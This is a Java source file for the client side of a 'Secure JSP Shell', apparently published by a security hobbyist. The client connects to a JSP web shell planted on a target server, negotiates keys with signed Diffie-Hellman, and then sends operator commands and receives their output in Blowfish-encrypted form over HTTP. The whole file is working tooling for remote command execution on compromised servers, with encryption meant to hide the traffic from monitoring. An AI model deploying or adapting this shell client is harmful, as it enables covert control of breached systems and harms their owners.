import java.io.*;
import java.net.*;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;

/**
 * Secure JSP Shell (SJS) with prolly flawed encryption
 * Author: http://diablohorn.wordpress.com
 * Borrowed and modified code from the following sources:
 *  http://www.javaworld.com/javaworld/jw-12-2000/jw-1229-traps.html?page=4
 *  http://stackoverflow.com/questions/992019/java-256bit-aes-encryption
 *  http://java.sun.com/developer/technicalArticles/Security/AES/AES_v1.html
 *  http://www.devdaily.com/java/edu/pj/pj010011
 *  http://www.exampledepot.com/egs/javax.crypto/KeyAgree.html
 *  http://stackoverflow.com/questions/2793150/how-to-use-java-net-urlconnection-to-fire-and-handle-http-requests
 */
public class SJSc {
    String cookie = null;
    static String shellhost;
    static String doEnc;
    private void displayUsage(String[] handleArgs){
        if(handleArgs.length > 2 || handleArgs.length < 1){
            System.out.println("java SJSc <http://hostwithshell/path/page.jsp> <enc/pln>");
            System.exit(0);
        }

        if(handleArgs.length == 1){
            SJSc.shellhost = handleArgs[0];
        }

        if(handleArgs.length == 2){
            SJSc.shellhost = handleArgs[0];
            SJSc.doEnc = handleArgs[1];
        }
    }
   
    private String retrievePage(String address) throws MalformedURLException, IOException{
        URL u = new URL(address);
        BufferedReader reader = null;
        String s;
        StringBuffer output = new StringBuffer();
        URLConnection connection = null;
        if(this.cookie == null){
            connection = u.openConnection();
            this.cookie = connection.getHeaderField("Set-Cookie").split(";")[0];
        }else{
            connection = u.openConnection();
            connection.addRequestProperty("Cookie",this.cookie);
        }
        //System.out.println("url:" + connection.getURL().toString());
        reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        for (String line; (line = reader.readLine()) != null;) {
            output.append(line + System.getProperty("line.separator"));
        }
        reader.close();
        return output.toString().trim();
    }
    
    public static void main(String[] args) throws MalformedURLException, IOException, NoSuchAlgorithmException, FileNotFoundException, NoSuchProviderException {
        SJSc sjsclient = new SJSc();
        sjsclient.displayUsage(args);
        String currentPath = new java.io.File(".").getCanonicalPath();
        //dirty but ohwell
        if(shellhost.equalsIgnoreCase("gen")){
            //generate dsa keypairs
            SeComDH.generateDSAKeyPair(currentPath.concat("/publicalice.dsa"), currentPath.concat("/privatealice.dsa"));
            SeComDH.generateDSAKeyPair(currentPath.concat("/publicbob.dsa"), currentPath.concat("/privatebob.dsa"));
            System.exit(0);
        }

        if (doEnc.equalsIgnoreCase("pln")) {
            String cmdoutput = null;
            while (true) {
                try {
                    BufferedReader bufferRead = new BufferedReader(new InputStreamReader(System.in));
                    cmdoutput = sjsclient.retrievePage(new String(shellhost + "?t=" + URLEncoder.encode(bufferRead.readLine().trim(), "UTF-8")));
                    System.out.print(cmdoutput);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        System.out.println("Securely negotiating keys");
        try {
            SeComDH sc = new SeComDH();
            String alicesharedsecret = null;
            String cmdinput = null;
            String alicepubkey = sc.getAlicePublicKey();
            //sign our pubkey stuff
            byte[] alicepubkeysig = SeComDH.signWithDSA(SeComDH.asByte(alicepubkey),currentPath.concat("/privatealice.dsa"));
            // Send the signed public key bytes & Retrieve the signed public key bytes from the other party
            String[] bobres = sjsclient.retrievePage(new String(shellhost + "?e=yeah&dp=" + alicepubkey + "&s=" + SeComDH.asHex(alicepubkeysig))).split(";");
            String bobhispublickey = bobres[0];
            String bobhispublickeysig = bobres[1];
            if(!SeComDH.verifyWithDSA(SeComDH.asByte(bobhispublickey), SeComDH.asByte(bobhispublickeysig), currentPath.concat("/publicbob.dsa"))){
                System.out.println("SIGCHECKFAILED");
                System.exit(0);
            }
            // generate the key
            sc.aliceGenerateSecret(SeComDH.asByte(bobhispublickey));
            alicesharedsecret = SeComDH.md5(sc.getAliceSharedSecret());
            System.out.println("You can now issue commands to your shell");
            while (true) {
                BufferedReader bufferRead = new BufferedReader(new InputStreamReader(System.in));
                cmdinput = bufferRead.readLine().trim();
                // Use the secret key to encrypt/decrypt data;
                String[] ciphertext = SeComDH.encryptBlowfish(cmdinput, alicesharedsecret);
                String[] tempres = sjsclient.retrievePage(new String(shellhost + "?t=" + ciphertext[0] + "&i=" + ciphertext[1])).split(System.getProperty("line.separator"));
                for(int i=0;i<tempres.length;i++){
                    String tempiv = tempres[i].substring(0, 16);
                    String tempcrypt = tempres[i].substring(16);
                    System.out.println(SeComDH.decryptBlowfish(tempcrypt, alicesharedsecret ,tempiv));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
    }

}

/* EXAMPLE USAGE
try{
  //generate dsa keypairs
  String currentPath = new java.io.File(".").getCanonicalPath();
  SeComDH.generateDSAKeyPair(currentPath.concat("/publicalice.dsa"), currentPath.concat("/privatealice.dsa"));
  SeComDH.generateDSAKeyPair(currentPath.concat("/publicbob.dsa"), currentPath.concat("/privatebob.dsa"));

  //instantiate alice
  SeComDH sca = new SeComDH(1024);
  byte[] aliceherpublickey = SeComDH.asByte(sca.getAlicePublicKey());
  //pretend we send public key and thus need to sign it
  byte[] sigalice = SeComDH.signWithDSA(aliceherpublickey, currentPath.concat("/privatealice.dsa"));
  //pretend we receive public key+sig and thus need to verify it
  boolean veralice = SeComDH.verifyWithDSA(aliceherpublickey, sigalice, currentPath.concat("/publicalice.dsa"));
  System.out.println(veralice);
  //instantiate bob with public key from alice and generate secret
  SeComDH scb = new SeComDH(aliceherpublickey);
  scb.bobGenerateSecret();
  //pretend we send public key and thus need to sign it
  //also pretend we receive it and need to verify it
  byte[] bobhispublickey = SeComDH.asByte(scb.getBobPublicKey());
  byte[] sigbob = SeComDH.signWithDSA(bobhispublickey, currentPath.concat("/privatebob.dsa"));
  boolean verbob = SeComDH.verifyWithDSA(bobhispublickey, sigbob, currentPath.concat("/publicbob.dsa"));
  System.out.println(verbob);
  //alice generate secretkey
  sca.aliceGenerateSecret(bobhispublickey);
  //print both secret keys
  //diffie outputs big keys, so we just hash the to get the correct size
  //should be iterated etc
  String as = SeComDH.sha256(sca.getAliceSharedSecret());
  System.out.println(as);
  String bs = SeComDH.sha256(scb.getBobSharedSecret());
  System.out.println(bs);
  String[] cryptext = SeComDH.encryptBlowfish("test this is a test", as);
  System.out.println(cryptext[0] + ":" + cryptext[1]);
  String plaintext = SeComDH.decryptBlowfish(cryptext[0], bs, cryptext[1]);
  System.out.println(plaintext);
} catch(Exception e){
  e.printStackTrace();
}
 */
